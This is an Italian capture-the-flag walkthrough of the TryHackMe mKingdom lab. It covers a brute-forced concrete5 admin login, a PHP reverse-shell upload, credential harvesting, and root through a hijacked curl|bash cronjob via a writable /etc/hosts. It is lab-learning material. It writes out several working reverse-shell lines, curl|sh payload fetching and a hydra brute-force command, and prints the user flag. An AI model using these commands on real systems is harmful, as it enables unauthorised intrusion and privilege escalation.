
#laboratorio #tryhackmelabs 

https://tryhackme.com/room/mkingdom

```
nmap -Pn -v -O -p- 10.10.166.114 
```
```
PORT   STATE SERVICE
85/tcp open  mit-ml-dev
```

```
nmap -sVC -p85 10.10.166.114 
```
```
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN

```

andiamo su 
```
http://10.10.166.114:85/
```
troviamo una pagina con un immagine e scritto
```
Bwa, ha, ha, pathetic, you'll never learn!
```
enumeriamo un po'
```
gobuster dir -u http://10.10.166.114:85 -w /usr/share/wordlists/dirb/common.txt -t50
```
troviamo
```
http://10.10.166.114:85/app/
```

c'è un pulsante che se premuto scrive
```
Make yourself confortable and enjoy my place
```
poi apre
```
http://10.10.166.114:85/app/castle/
```

dopo aver perso un po di tempo ad esplorare il sito proviamo ad accedere al login
```
http://10.10.166.114:85/app/castle/index.php/login
```
il sito è fatto in Built with [concrete5](http://www.concrete5.org/) CMS.

apriamo Burp Suite e catturiamo la richiesta di login
```
POST /app/castle/index.php/login/authenticate/concrete HTTP/1.1
Host: 10.10.166.114:85
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://10.10.166.114:85
Connection: keep-alive
Referer: http://10.10.166.114:85/app/castle/index.php/login
Upgrade-Insecure-Requests: 1
Priority: u=0, i

uName=admin&uPassword=123456&ccm_token=1747923213%3A474a13e851c0663b905373d919df405c
```

proviamo con hydra
```
hydra -s 85 -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt 10.10.166.114 http-post-form '/app/castle/index.php/login/authenticate/concrete:uName=^USER^&uPassword=^PASS^&ccm_token=1747923213%3A474a13e851c0663b905373d919df405c&from=&Submit=Sign+in:Invalid username or password' -f -o login_brute_force.txt
```

troviamo credenziali e ci logghiamo
```
admin:password
```

troviamo un Upload Files dove tentiamo di caricare un PHP reverse shell,
```
nano revshell.php
```
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");
```
ma non funziona!

dopo aver visto che ci sono dei filtri attivi andiamo in
System & Settings - Files - Allowed File Types ed aggiungiamo , php e salviamo

ora proviamo a ricaricare la reverse shell php

ci mettiamo in ascolto
```
nc -lvnp 1234
```

andiamo sul file uplodato
```
http://10.10.166.114:85/app/castle/application/files/9517/4792/4996/revshell.php
```

ed otteniamo la reverse shell!
```
<html/app/castle/application/files/9517/4792/4996$ whoami                    
www-data
```

Dopo uno sguardo generale abbiamo individuato una directory di configurazione in **/var/www/html/appcastle/application/config**

```
www-data@mkingdom:/var/www/html/app/castle/application/config$ ls
ls
app.php
database.php
doctrine
generated_overrides
```
```
cat database.php
```
```
<html/app/castle/application/config$ cat database.php                        
<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];

```
abbiamo le credenziali db di toad
```
'database' => 'mKingdom'
'username' => 'toad',
'password' => 'toadisthebest',
```
passiamo all'account di Toad

```
su toad
```
	toadisthebest
abbiamo qualche problema stabbilizziamo il terminale
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
ora possiamo passare a toad
```
su toad
```
	toadisthebest
facciamo un po di ricerche ma non troviamo il flag user.txt associato a Mario
topo tanto troviamo nelle variabili d'ambiente qualcosa..
```
env
```
```
toad@mkingdom:/var/www/html/app/castle/application/files/9517/4792/4996$ env
env
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_ID=c2
SHELL=/bin/bash
APACHE_RUN_USER=www-data
USER=toad
LS_COLORS=
PWD_token=aWthVGVOVEFOdEVTCg==
```

```
PWD_token=aWthVGVOVEFOdEVTCg==
```

```
echo "aWthVGVOVEFOdEVTCg==" | base64 -d
```
```
ikaTeNTANtES
```
probabile password di Mario 

```
su mario
```
e ci siamo..
```
id
uid=1001(mario) gid=1001(mario) groups=1001(mario)
```
cerchiamo user.txt
```
find / -name "user.txt" 2>/dev/null
```
```
/home/mario/user.txt
```
```
cat /home/mario/user.txt
```
non la fa leggere richiede privilegi di root
proviamo a copiarla in tmp
```
cp /home/mario/user.txt /tmp/user.txt
```

```
cat /tmp/user.txt
```
```
thm{030a769febb1b3291da1375234b84283}
```

dopo aver provato ad scalare i privilegi con suid e tentata enumerazione manuale
ho provato a vedere con LinPeas
```
cd /home/kali/linpeas/
```

dal pc attaccante apriamo un server python
```
sudo python3 -m http.server 8080 #Host
```
dalla vittima  facciamo puntare al nostro IP al tools linpeas
```
curl 10.14.99.134:8080/linpeas.sh | sh 
```

Guardando l'output dei linpeas
il file **/etc/hosts** era scrivibile.

Ho usato pspy64 per monitorare l'attività del sistema in tempo reale.
Utilizziamo lo [script pspy](https://github.com/DominicBreuker/pspy) per elencare i processi in esecuzione. Lo script ci permette di visualizzare i processi in esecuzione di tutti gli utenti senza privilegi sudo. Scarica lo script sul tuo computer.

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

avvia un server web Python sulla tua macchina Kali con il seguente comando.

```
python3 -m http.server 8080
```

Ora, scarica lo script dal computer di destinazione.

```
cd /tmp
```

```
wget http://10.14.99.134:8080/pspy64
```

```
chmod +x pspy64
```

```
./pspy64
```

ho scoperto un cronjob configurato per scaricare ed eseguire uno script shell come root.

Il cronjob recuperava lo script della shell da un server remoto utilizzando il comando:

```
2025/05/23 10:22:27 CMD: UID=0     PID=1      | /sbin/init
2025/05/23 10:23:01 CMD: UID=0     PID=27196  | bash 
2025/05/23 10:23:01 CMD: UID=0     PID=27195  | curl mkingdom.thm:85/app/castle/application/counter.sh 
2025/05/23 10:23:01 CMD: UID=0     PID=27194  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2025/05/23 10:23:01 CMD: UID=0     PID=27193  | CRON 
```




Creiamo un percorso `/app/castle/application/` (mkdir)

Creiamo il nostro counter.sh malevolo
```
nano counter.sh
```
```
#!/bin/bash  
bash -i >& /dev/tcp/10.14.99.134/1212 0>&1
```
avviamo un nostro server a monte di  `/app/castle/application/`
```
python3 -m http.server 85
```
mettiamoci intanto in ascolto da un altro terminale (tempo di modificare il file host sulla vittima)
```
nc -lvnp 1212
```
su macchina vittima modifichiamo /etc/hosts per risolvere mkingdom.thm sul nostro IP locale attaccante

```
vi /etc/hosts
```
```
127.0.0.1       localhost
10.14.99.134    mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org
```

Quando il cronjob ha eseguito counter.sh, ha stabilito una connessione shell inversa, concedendomi l'accesso root.
```
root@mkingdom:~# ls
ls
counter.sh
root.txt
root@mkingdom:~# 
cat root.txt
cat: root.txt: Permission denied
```
non ci fa leggere il file ,quindi lo copiamo in /tmp e lo leggiamo da li
```
root@mkingdom:~# cp root.txt /tmp
cp root.txt /tmp
root@mkingdom:~# cat /tmp/root.txt
cat /tmp/root.txt
thm{xxxxxxxxxxx}
```

ecco la nostra flag!
```
thm{xxxxxxxxxxx}
```